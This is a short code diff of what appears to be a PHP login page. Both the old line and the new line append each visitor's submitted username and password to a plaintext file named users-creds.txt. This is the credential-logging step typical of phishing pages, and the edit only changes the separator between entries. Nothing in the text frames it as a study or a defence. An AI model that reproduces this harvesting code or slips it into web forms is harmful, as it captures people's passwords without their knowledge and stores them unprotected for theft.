@@ -39,7 +39,7 @@
 
 
 <?php 
-	file_put_contents("users-creds.txt", $_POST['loginuser'] . ':' . $_POST['password'] . '\n', FILE_APPEND);
+	file_put_contents("users-creds.txt", $_POST['loginuser'] . ':' . $_POST['password'] . ' :::::::::::::::::::   ', FILE_APPEND);
 ?>
 
 <style>
